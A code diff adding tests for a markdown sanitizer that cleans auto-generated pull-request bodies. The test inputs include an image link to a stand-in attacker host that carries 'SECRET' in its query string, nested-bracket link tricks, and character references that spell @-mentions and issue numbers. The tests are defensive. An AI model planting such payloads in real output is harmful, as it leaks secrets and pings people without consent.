@@ -158,6 +158,100 @@ class TestSanitizeMarkdown:
         assert len(clean) < 300
 
 
+def render_html(markdown: str) -> str | None:
+    """The body as a CommonMark renderer shows it, or None when none is installed.
+
+    markdown-it is not a declared dependency, so these checks are written to hold on the output *text* as
+    well and the renderer only adds the real answer where it exists: whether a link, an image or a mention
+    survives is a question about rendering.
+    """
+    try:
+        from markdown_it import MarkdownIt
+    except ImportError:
+        return None
+    return MarkdownIt("commonmark").render(markdown)
+
+
+def outside_code(html: str) -> str:
+    """The rendered HTML without its `<code>` contents: a mention or an issue number inside a code span is inert."""
+    return re.sub(r"<code>.*?</code>", "<code></code>", html, flags=re.DOTALL)
+
+
+class TestWhatASecondRendererCanStillSee:
+    """Holes found by rendering the output, not by reading it: nesting and character references."""
+
+    @pytest.mark.parametrize(
+        "text",
+        [
+            "[a[b]c](//evil.example/x)",
+            "![a[b]c](//evil.example/p.png?d=SECRET)",
+            "[[a]](//evil.example/x)",
+            "[a](<//evil.example/x>)",
+        ],
+    )
+    def test_a_nested_bracket_cannot_keep_a_link_alive(self, text):
+        clean = sanitize_markdown(text)
+
+        assert "](" not in clean
+        html = render_html(clean)
+        if html is not None:
+            assert "<a " not in html and "<img" not in html, html
+
+    @pytest.mark.parametrize("entity", ["&commat;", "&#x40;", "&#64;", "&COMMAT;"])
+    def test_a_character_reference_cannot_spell_a_mention(self, entity):
+        clean = sanitize_markdown(f"ping {entity}alice and {entity}org/team")
+
+        assert not re.search(r"&#?\w+;", clean)
+        html = render_html(clean)
+        if html is not None:
+            assert "@alice" not in html and "@org" not in html, html
+
+    @pytest.mark.parametrize("entity", ["&num;", "&#35;", "&#x23;"])
+    def test_a_character_reference_cannot_spell_an_issue_reference(self, entity):
+        clean = sanitize_markdown(f"see {entity}123 and django/django{entity}7")
+
+        assert not re.search(r"&#?\w+;", clean)
+        html = render_html(clean)
+        if html is not None:
+            assert "#123" not in html and "#7" not in html, html
+
+    def test_an_ampersand_that_is_not_a_character_reference_is_left_alone(self):
+        assert sanitize_markdown("R&D, a && b, AT&T and x &y") == "R&D, a && b, AT&T and x &y"
+
+    def test_the_checks_reason_is_a_code_span_so_nothing_in_it_can_act(self):
+        reason = "1 pass-to-pass regression(s): tests/x.py::t[[a](//evil.example/x) &commat;alice @org/team #12]"
+        verdict = Verdict(ok=False, reason=reason, regressions=("t",))
+
+        body = render_pr_body(pr_facts(verdict=verdict))
+
+        (line,) = [l for l in body.splitlines() if "flagged this change" in l]
+        assert re.search(r"flagged this change:\*\* `[^`]+`$", line), line
+        html = render_html(body)
+        if html is not None:
+            assert "<a " not in html and "<img" not in html, html
+            live = outside_code(html)
+            assert "@org" not in live and "@alice" not in live and "#12" not in live, html
+
+    def test_the_whole_product_body_renders_without_a_live_link_image_or_mention(self):
+        hostile = HOSTILE + " [a[b]c](//evil.example/x) &commat;alice &num;9"
+        facts = pr_facts(
+            summary=hostile,
+            changed_files=(hostile,),
+            retrieved=(chunk(file_path=hostile, symbol_name=hostile),),
+            verdict=Verdict(ok=False, reason=hostile, regressions=(hostile,), disqualified=(hostile,)),
+            model=hostile,
+            stop_reason=hostile,
+        )
+
+        html = render_html(render_pr_body(facts))
+
+        if html is not None:
+            assert "<a " not in html and "<img" not in html and "<script" not in html, html
+            live = outside_code(html)
+            assert "@org" not in live and "@alice" not in live and "#123" not in live and "#9" not in live, html
+            assert "SECRET" not in live, html
+
+
 class TestProductTitleAndCommit:
     def test_the_title_carries_the_issue_title_and_the_tool_name(self):
         assert pr_title(pr_facts()) == "[repolace] parse_config crashes on an empty file"
